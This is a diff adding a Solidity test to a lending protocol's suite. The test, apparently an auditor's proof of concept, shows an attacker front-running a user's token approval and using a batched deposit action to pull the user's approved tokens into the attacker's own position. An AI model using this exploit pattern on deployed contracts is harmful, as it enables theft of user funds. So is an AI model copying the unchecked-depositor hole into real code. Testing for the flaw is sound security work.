@@ -157,4 +157,37 @@ contract ScpBorrowTest is BaseTest {
         riskEngine.setOracle(address(pool), address(erc20Collat), address(collatTokenOracle));
         riskEngine.setLtv(address(pool), address(erc20Collat), 4e18); // 400% ltv
     }
+
+    function testFailZach_DepositFrontrun() public {
+        // a user with 1e18 tokens
+        address user = makeAddr("user");
+        erc20Collat.mint(user, 1e18);
+
+        // user approves the position manager in advance of depositing them
+        vm.prank(user);
+        erc20Collat.approve(address(positionManager), 1e18);
+
+        // an attacker can jump in and steal the tokens for their own position
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+
+        uint256 POSITION_TYPE = 0x2;
+        bytes32 salt = "AttackerSingleAssetPosition";
+        SingleAssetPosition attackerPosition = SingleAssetPosition(portfolioLens.predictAddress(POSITION_TYPE, salt));
+        bytes memory newPosData = abi.encode(attacker, POSITION_TYPE, salt);
+        Action memory newPosAction = Action({op: Operation.NewPosition, data: newPosData});
+
+        bytes memory depositData = abi.encode(user, address(erc20Collat), 1e18);
+        Action memory depositAction = Action({op: Operation.Deposit, data: depositData});
+
+        Action[] memory actions = new Action[](2);
+        actions[0] = newPosAction;
+        actions[1] = depositAction;
+
+        positionManager.processBatch(address(attackerPosition), actions);
+
+        // now the attacker has the user funds
+        assertEq(erc20Collat.balanceOf(address(attackerPosition)), 1e18);
+        assertEq(erc20Collat.balanceOf(user), 0);
+    }
 }
